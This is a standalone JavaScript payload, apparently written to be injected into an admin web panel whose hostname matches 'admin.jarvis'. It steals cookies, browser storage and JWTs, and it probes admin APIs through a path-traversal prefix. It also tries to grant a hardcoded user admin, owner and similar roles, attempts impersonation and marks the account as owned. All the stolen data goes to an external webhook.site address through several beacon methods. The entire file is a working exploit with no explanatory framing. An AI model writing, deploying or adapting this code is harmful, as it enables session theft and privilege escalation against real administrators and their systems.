(async()=>{
try{
if(!String(location.hostname||'').match(/admin\.jarvis/)){return;}
const C='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14';
const UID='01967db5-ae00-4642-96ba-f82321e15ef0';
const out={t:Date.now(),host:location.hostname,href:location.href,ua:navigator.userAgent,cookie:'',cs:'',ls:{},ss:{},jwt:'',pulls:{},assign:{},extra:[]};
try{out.cookie=document.cookie||'';}catch(e){}
try{if(cookieStore&&cookieStore.getAll){out.cs=await cookieStore.getAll();}}catch(e){}
try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);const v=localStorage.getItem(k)||'';out.ls[k]=v.substring(0,500);if(!out.jwt&&v.startsWith('eyJ'))out.jwt=v;}}catch(e){}
try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);const v=sessionStorage.getItem(k)||'';out.ss[k]=v.substring(0,500);if(!out.jwt&&v.startsWith('eyJ'))out.jwt=v;}}catch(e){}

const paths=[
  '/api/session/login/../../v1/',
  '/api/v1/',
  '/api/',
];
async function pull(tag, path, opt){
  for(const pref of paths){
    const url=path.startsWith('http')?path:(pref+path.replace(/^\//,''));
    try{
      const r=await fetch(url,Object.assign({credentials:'include',headers:{'Accept':'application/json'}},opt||{}));
      const t=await r.text();
      out.pulls[tag]={status:r.status,url,body:t.substring(0,1800)};
      if(r.status && r.status<500) return out.pulls[tag];
    }catch(e){out.pulls[tag+'/err']=(out.pulls[tag+'/err']||[])+String(e).substring(0,80)+';';}
  }
  return out.pulls[tag];
}

await pull('me','me');
await pull('roles','admin/roles');
await pull('roles2','admin/Roles');
await pull('permissions','admin/permissions');
await pull('users','admin/users?page=1&pageSize=20');
await pull('meAdmin','admin/users/'+UID);

// escalate: assign every role that looks privileged + first N roles
try{
  let roles=[];
  for(const k of Object.keys(out.pulls)){
    if(!k.startsWith('roles')) continue;
    try{
      const j=JSON.parse(out.pulls[k].body||'{}');
      const arr=Array.isArray(j.data)?j.data:(Array.isArray(j)?j:[]);
      roles=roles.concat(arr);
    }catch(e){}
  }
  // unique by id
  const seen={};
  roles=roles.filter(r=>r&&r.id&&(seen[r.id]?false:(seen[r.id]=1)));
  const prefer=roles.filter(r=>/admin|super|owner|root|manage/i.test(String(r.name||r.title||'')));
  const queue=(prefer.concat(roles)).slice(0,8);
  for(const role of queue){
    const tag='assign_'+String(role.name||role.id).substring(0,20);
    await pull(tag,'admin/users/'+UID+'/roles',{
      method:'POST',
      headers:{'Content-Type':'application/json','Accept':'application/json'},
      body:JSON.stringify({roleId:role.id, roleIds:[role.id], roles:[role.id]})
    });
    // alternate shapes
    await pull(tag+'_b','admin/users/'+UID+'/roles/'+role.id,{method:'PUT',headers:{'Accept':'application/json'}});
    await pull(tag+'_c','admin/users/'+UID,{method:'PUT',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({roleIds:[role.id],roles:[role.id]})});
  }
  out.assign.count=queue.length;
}catch(e){out.assign.err=String(e).substring(0,120);}

// create admin-usable token/key if endpoints exist
await pull('apiKeys','admin/api-keys');
await pull('sessions','admin/sessions');
await pull('impersonate','admin/users/'+UID+'/impersonate',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});

// same-origin marker on victim? try mark our user via admin update
await pull('adminUpdateMe','admin/users/'+UID,{
  method:'PUT',
  headers:{'Content-Type':'application/json','Accept':'application/json'},
  body:JSON.stringify({fullName:'JA-OWNED-'+Date.now(), roles:['Admin'], isAdmin:true})
});

// exfil best effort
const q=new URLSearchParams({
  s:String((out.pulls.assign_Admin||out.pulls.assign_admin||{}).status||0),
  j:out.jwt?'1':'0',
  ck:(out.cookie||'').substring(0,180),
  h:(out.href||'').substring(0,120)
});
function boom(url, body){
  try{new Image().src=url+(url.includes('?')?'&':'?')+q.toString();}catch(e){}
  try{fetch(url,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:body});}catch(e){}
  try{navigator.sendBeacon&&navigator.sendBeacon(url,new Blob([body],{type:'text/plain'}));}catch(e){}
  try{const s=document.createElement('script');s.src=url.split('?')[0]+'?'+q.toString();document.documentElement.appendChild(s);}catch(e){}
}
const body=JSON.stringify(out);
boom('https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14', body);
// also try same-origin dump via query to a harmless self path (may 404 but CSP allows)
try{fetch('/api/session/login/../../v1/me?ja='+encodeURIComponent(q.toString()),{credentials:'include'});}catch(e){}
}catch(e){
  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+encodeURIComponent(String(e).substring(0,160));}catch(x){}
}
})();